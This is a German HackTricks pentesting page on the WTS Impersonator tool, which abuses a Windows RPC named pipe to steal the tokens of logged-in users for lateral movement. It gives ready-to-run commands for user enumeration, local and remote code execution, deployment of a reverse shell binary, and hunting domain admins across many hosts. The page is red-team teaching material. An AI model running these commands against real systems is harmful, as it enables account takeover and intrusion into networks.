<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

Das Tool **WTS Impersonator** nutzt die RPC-Named Pipe **"\\pipe\LSM_API_service"** aus, um sich heimlich bei angemeldeten Benutzern einzuloggen und ihre Tokens zu übernehmen. Dabei umgeht es herkömmliche Token-Impersonationstechniken. Dieser Ansatz erleichtert nahtlose laterale Bewegungen innerhalb von Netzwerken. Die Innovation hinter dieser Technik wird **Omri Baso** zugeschrieben, dessen Arbeit auf [GitHub](https://github.com/OmriBaso/WTSImpersonator) zugänglich ist.

### Kernfunktionalität
Das Tool arbeitet mit einer Sequenz von API-Aufrufen:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Schlüsselmodule und Verwendung
- **Benutzer auflisten**: Mit dem Tool ist eine lokale und entfernte Benutzerenumeration möglich, wobei für beide Szenarien entsprechende Befehle verwendet werden:
- Lokal:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remote, durch Angabe einer IP-Adresse oder eines Hostnamens:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Befehle ausführen**: Die Module `exec` und `exec-remote` erfordern einen **Service**-Kontext, um zu funktionieren. Die lokale Ausführung erfordert lediglich die ausführbare Datei WTSImpersonator und einen Befehl:
- Beispiel für die lokale Ausführung eines Befehls:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kann verwendet werden, um einen Service-Kontext zu erhalten:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote-Befehlsausführung**: Hierbei wird ähnlich wie bei PsExec.exe ein Dienst remote erstellt und installiert, der die Ausführung mit entsprechenden Berechtigungen ermöglicht.
- Beispiel für die Remote-Ausführung:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Benutzerjagd-Modul**: Zielt auf bestimmte Benutzer in mehreren Maschinen ab und führt Code unter ihren Anmeldeinformationen aus. Dies ist besonders nützlich, um Domänenadministratoren mit lokalen Administratorrechten auf mehreren Systemen anzugreifen.
- Beispiel für die Verwendung:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
